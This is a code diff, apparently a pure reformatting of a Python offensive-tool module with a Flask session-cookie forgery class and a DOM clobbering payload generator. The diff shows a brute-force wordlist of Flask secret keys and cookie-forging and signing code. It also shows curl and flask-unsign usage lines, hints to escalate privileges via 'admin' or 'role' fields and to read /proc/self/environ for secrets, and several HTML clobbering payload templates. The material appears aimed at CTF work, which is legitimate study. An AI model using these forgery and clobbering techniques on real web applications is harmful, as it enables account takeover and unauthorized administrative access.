@@ -5,12 +5,12 @@ Provides utilities for forging Flask/itsdangerous session cookies and generating
 DOM clobbering payloads that overwrite JavaScript variables via HTML injection.
 """
 
-import json
+import base64
 import hashlib
 import hmac
-import base64
+import json
 import zlib
-from typing import Dict, List, Optional
+from typing import List, Optional
 
 
 class FlaskSessionForgeryTool:
@@ -46,21 +46,67 @@ class FlaskSessionForgeryTool:
 
     # Common Flask secret keys found in CTFs
     COMMON_SECRETS: List[str] = [
-        "secret", "secret_key", "secretkey", "SECRET_KEY",
-        "supersecret", "password", "password123", "admin",
-        "flask", "flask-secret", "flasksecret", "change_me",
-        "changeme", "development", "dev", "test", "testing",
-        "key", "my_secret", "mysecret", "app_secret",
-        "s3cr3t", "s3cret", "default", "debug", "1234",
-        "12345", "123456", "qwerty", "asdf", "letmein",
-        "abc123", "monkey", "master", "dragon", "login",
-        "princess", "football", "shadow", "sunshine", "trustno1",
-        "iloveyou", "batman", "access", "hello", "charlie",
-        "CHANGE_ME", "the_secret_key", "thesecretkey",
-        "my-secret-key", "my_secret_key", "flask_secret",
-        "hackthebox", "ctf", "flag", "HTB", "picoCTF",
-        "supersecretkey", "super_secret_key",
-        "ThisIsNotSoSecret", "NoTSoS3cR3t",
+        "secret",
+        "secret_key",
+        "secretkey",
+        "SECRET_KEY",
+        "supersecret",
+        "password",
+        "password123",
+        "admin",
+        "flask",
+        "flask-secret",
+        "flasksecret",
+        "change_me",
+        "changeme",
+        "development",
+        "dev",
+        "test",
+        "testing",
+        "key",
+        "my_secret",
+        "mysecret",
+        "app_secret",
+        "s3cr3t",
+        "s3cret",
+        "default",
+        "debug",
+        "1234",
+        "12345",
+        "123456",
+        "qwerty",
+        "asdf",
+        "letmein",
+        "abc123",
+        "monkey",
+        "master",
+        "dragon",
+        "login",
+        "princess",
+        "football",
+        "shadow",
+        "sunshine",
+        "trustno1",
+        "iloveyou",
+        "batman",
+        "access",
+        "hello",
+        "charlie",
+        "CHANGE_ME",
+        "the_secret_key",
+        "thesecretkey",
+        "my-secret-key",
+        "my_secret_key",
+        "flask_secret",
+        "hackthebox",
+        "ctf",
+        "flag",
+        "HTB",
+        "picoCTF",
+        "supersecretkey",
+        "super_secret_key",
+        "ThisIsNotSoSecret",
+        "NoTSoS3cR3t",
         "A0Zr98j/3yX R~XHH!jmN]LWX/,?RT",
     ]
 
@@ -147,11 +193,10 @@ class FlaskSessionForgeryTool:
 
         # itsdangerous uses a timestamp
         import time
+
         timestamp = int(time.time())
         timestamp_b64 = self._b64_encode(
-            timestamp.to_bytes(
-                (timestamp.bit_length() + 7) // 8, byteorder="big"
-            )
+            timestamp.to_bytes((timestamp.bit_length() + 7) // 8, byteorder="big")
         )
 
         # Build the value to sign
@@ -171,9 +216,7 @@ class FlaskSessionForgeryTool:
             derived_key = mac.digest()
 
         # Sign
-        sig = hmac.new(
-            derived_key, value.encode("utf-8"), digest_method
-        ).digest()
+        sig = hmac.new(derived_key, value.encode("utf-8"), digest_method).digest()
         sig_b64 = self._b64_encode(sig)
 
         return f"{value}.{sig_b64}"
@@ -237,7 +280,18 @@ class FlaskSessionForgeryTool:
         interesting = []
         for key in payload:
             kl = key.lower()
-            if any(w in kl for w in ("admin", "role", "is_admin", "privilege", "user", "uid", "group")):
+            if any(
+                w in kl
+                for w in (
+                    "admin",
+                    "role",
+                    "is_admin",
+                    "privilege",
+                    "user",
+                    "uid",
+                    "group",
+                )
+            ):
                 interesting.append(f"  {key}: {payload[key]}")
 
         if interesting:
@@ -261,7 +315,9 @@ class FlaskSessionForgeryTool:
         secret = data.get("secret", "")
 
         if not payload_data:
-            return "[FlaskSessionForgeryTool] Error: 'data' (dict) is required for forge."
+            return (
+                "[FlaskSessionForgeryTool] Error: 'data' (dict) is required for forge."
+            )
         if not secret:
             return "[FlaskSessionForgeryTool] Error: 'secret' is required for forge."
 
@@ -280,17 +336,21 @@ class FlaskSessionForgeryTool:
             lines.append(forged)
             lines.append("")
             lines.append("USAGE:")
-            lines.append(f"Set cookie 'session' to the value above.")
+            lines.append("Set cookie 'session' to the value above.")
             lines.append("Example with curl:")
             lines.append(f'  curl -b "session={forged}" http://target/')
             lines.append("")
             lines.append("Example with cookie_set tool:")
-            lines.append(f'  {{"url": "http://target/", "name": "session", "value": "{forged}"}}')
+            lines.append(
+                f'  {{"url": "http://target/", "name": "session", "value": "{forged}"}}'
+            )
         except Exception as e:
             lines.append(f"[!] Error forging cookie: {e}")
             lines.append("")
             lines.append("Alternative: Use flask-unsign CLI tool:")
-            lines.append(f"  flask-unsign --sign --cookie '{json.dumps(payload_data)}' --secret '{secret}'")
+            lines.append(
+                f"  flask-unsign --sign --cookie '{json.dumps(payload_data)}' --secret '{secret}'"
+            )
 
         return "\n".join(lines)
 
@@ -338,17 +398,23 @@ class FlaskSessionForgeryTool:
                 lines.append("")
                 lines.append("NEXT STEPS:")
                 lines.append(f"1. Use the forge operation with secret={found_secret!r}")
-                lines.append("2. Modify fields like 'admin', 'role', 'is_admin' to escalate privileges")
+                lines.append(
+                    "2. Modify fields like 'admin', 'role', 'is_admin' to escalate privileges"
+                )
                 lines.append("3. Set the forged cookie and access protected endpoints")
         else:
             lines.append("[-] No matching secret found in wordlist.")
             lines.append("")
             lines.append("NEXT STEPS:")
             lines.append("1. Try a larger wordlist (provide 'wordlist' parameter)")
-            lines.append("2. Look for the secret in source code, config files, or environment")
+            lines.append(
+                "2. Look for the secret in source code, config files, or environment"
+            )
             lines.append("3. Check .git/config, /proc/self/environ, or debug pages")
             lines.append("4. Use flask-unsign with rockyou.txt:")
-            lines.append("   flask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt")
+            lines.append(
+                "   flask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt"
+            )
 
         return "\n".join(lines)
 
@@ -372,7 +438,9 @@ class FlaskSessionForgeryTool:
         lines.append("")
 
         if payload is None:
-            lines.append("[!] Could not decode payload — may not be Flask/itsdangerous.")
+            lines.append(
+                "[!] Could not decode payload — may not be Flask/itsdangerous."
+            )
             lines.append("")
             lines.append("Other session cookie frameworks to consider:")
             lines.append("  - Express.js (connect.sid) — try decoding as base64")
@@ -393,13 +461,21 @@ class FlaskSessionForgeryTool:
             kl = key.lower()
             if kl in ("admin", "is_admin", "isadmin"):
                 if val is False or val == 0 or val == "false" or val == "0":
-                    vectors.append(f"[!] '{key}' is {val!r} — set to True/1 for admin access")
+                    vectors.append(
+                        f"[!] '{key}' is {val!r} — set to True/1 for admin access"
+                    )
             elif kl in ("role", "user_role", "userrole"):
-                vectors.append(f"[!] '{key}' is {val!r} — try 'admin', 'administrator', 'root'")
+                vectors.append(
+                    f"[!] '{key}' is {val!r} — try 'admin', 'administrator', 'root'"
+                )
             elif kl in ("user", "username", "user_id", "uid"):
-                vectors.append(f"[*] '{key}' is {val!r} — try changing to 'admin' or user ID 1")
+                vectors.append(
+                    f"[*] '{key}' is {val!r} — try changing to 'admin' or user ID 1"
+                )
             elif kl in ("group", "groups", "permissions"):
-                vectors.append(f"[*] '{key}' is {val!r} — try escalating group/permissions")
+                vectors.append(
+                    f"[*] '{key}' is {val!r} — try escalating group/permissions"
+                )
 
         if vectors:
             for v in vectors:
@@ -503,7 +579,9 @@ class DomClobberingPayloadGenerator:
             lines.append(f"  -> window.{name} becomes the <a> element")
             lines.append(f"  -> window.{name}.toString() returns '{value}' (href)")
             lines.append("")
-            lines.append(f'<form id="{name}"><input name="value" value="{value}"></form>')
+            lines.append(
+                f'<form id="{name}"><input name="value" value="{value}"></form>'
+            )
             lines.append(f"  -> window.{name}.value.value === '{value}'")
             lines.append("")
             lines.append(f'<img id="{name}" name="{name}">')
@@ -517,18 +595,26 @@ class DomClobberingPayloadGenerator:
             lines.append("")
             lines.append("--- Method 1: <a> with id + name ---")
             lines.append(f'<a id="{parent}" name="{child}" href="{value}"></a>')
-            lines.append(f"  Note: id creates window.{parent}, name is accessible via .{child}")
+            lines.append(
+                f"  Note: id creates window.{parent}, name is accessible via .{child}"
+            )
             lines.append("")
             lines.append("--- Method 2: <form> with named input ---")
-            lines.append(f'<form id="{parent}"><input name="{child}" value="{value}"></form>')
+            lines.append(
+                f'<form id="{parent}"><input name="{child}" value="{value}"></form>'
+            )
             lines.append(f"  -> window.{parent}.{child}.value === '{value}'")
             lines.append("")
             lines.append("--- Method 3: <fieldset> with <a> ---")
-            lines.append(f'<fieldset id="{parent}"><a id="{child}" href="{value}"></a></fieldset>')
+            lines.append(
+                f'<fieldset id="{parent}"><a id="{child}" href="{value}"></a></fieldset>'
+            )
             lines.append(f"  -> window.{parent}.{child}.toString() returns '{value}'")
             lines.append("")
             lines.append("--- Method 4: HTMLCollection clobber ---")
-            lines.append(f'<a id="{parent}"></a><a id="{parent}" name="{child}" href="{value}"></a>')
+            lines.append(
+                f'<a id="{parent}"></a><a id="{parent}" name="{child}" href="{value}"></a>'
+            )
             lines.append(f"  -> window.{parent} becomes HTMLCollection")
             lines.append(f"  -> window.{parent}.{child} is the second <a>")
             lines.append(f"  -> .toString() returns '{value}'")
@@ -543,7 +629,7 @@ class DomClobberingPayloadGenerator:
             lines.append(
                 f'<form id="{p1}" name="{p1}">'
                 f'<input id="{p2}" name="{p3}" value="{value}">'
-                f'</form>'
+                f"</form>"
             )
             lines.append("")
             lines.append("--- Method 2: Nested fieldset ---")
@@ -551,14 +637,14 @@ class DomClobberingPayloadGenerator:
                 f'<fieldset id="{p1}">'
                 f'<fieldset id="{p2}">'
                 f'<a id="{p3}" href="{value}"></a>'
-                f'</fieldset>'
-                f'</fieldset>'
+                f"</fieldset>"
+                f"</fieldset>"
             )
             lines.append("")
             lines.append("--- Method 3: iframe srcdoc (if allowed) ---")
             lines.append(
                 f'<iframe name="{p1}" srcdoc="'
-                f'<a id={p2} name={p3} href={value}></a>'
+                f"<a id={p2} name={p3} href={value}></a>"
                 f'"></iframe>'
             )
             lines.append("")
